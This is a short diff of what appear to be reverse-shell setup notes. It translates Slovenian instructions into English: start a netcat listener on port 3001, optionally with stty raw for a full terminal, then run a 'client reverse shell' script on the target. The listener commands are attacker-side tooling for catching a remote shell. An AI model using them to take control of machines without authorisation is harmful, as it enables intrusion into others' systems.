@@ -1,8 +1,8 @@
 stty raw -echo; (stty size; cat) | nc -lvnp 3001
 
-ali
+or
 
 nc -lnvp 3001
 
-prilepi v command line od linuxa
-nato zaženi client reverse shell 2.ps1 na tarči
+paste into linux terminal
+than run client reverse shell on target
